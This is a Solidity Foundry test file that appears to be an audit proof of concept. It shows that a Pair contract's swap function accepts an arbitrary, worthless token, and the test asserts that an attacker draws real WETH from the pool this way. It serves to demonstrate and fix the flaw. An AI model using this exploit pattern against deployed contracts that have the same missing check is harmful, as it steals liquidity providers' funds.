// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import { Test } from "@forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { Constants } from "../helpers/Constants.sol";
import { Pair } from "../../contracts/Pair.sol";

contract PairH1Test is Test, Constants {
    function setUp() public {
        usdc = address(new ERC20Mock());
        weth = address(new ERC20Mock());
        pair = new Pair(usdc, weth);

        deal(usdc, USER_1, TOKEN_0_AMOUNT);
        deal(weth, USER_1, TOKEN_1_AMOUNT);

        vm.startPrank(USER_1);
        IERC20(usdc).approve(address(pair), TOKEN_0_AMOUNT);
        IERC20(weth).approve(address(pair), TOKEN_1_AMOUNT);
        pair.addLiquidity(TOKEN_0_AMOUNT, TOKEN_1_AMOUNT);
        vm.stopPrank();
    }

    function test_InvalidToken_DoNotRevert_() public {
        // Arrange attack
        address ATTACKER = makeAddr("ATTACKER");
        address invalidToken = address(new ERC20Mock());
        deal(invalidToken, ATTACKER, TOKEN_1_AMOUNT);
        vm.prank(ATTACKER);
        IERC20(invalidToken).approve(address(pair), TOKEN_1_AMOUNT);

        uint256 attackerWethPreBalance = IERC20(weth).balanceOf(ATTACKER);
        assertEq(attackerWethPreBalance, 0);

        uint256 expectedWethReceived = pair.getAmountOut(invalidToken, weth, TOKEN_1_AMOUNT);

        // Try to swap an invalid token
        vm.prank(ATTACKER);
        // vm.expectRevert(); // This should revert but doesn't
        pair.swap(invalidToken, weth, TOKEN_1_AMOUNT);

        uint256 attackerWethPostBalance = IERC20(weth).balanceOf(ATTACKER);
        assertEq(attackerWethPostBalance, expectedWethReceived);
    }
}
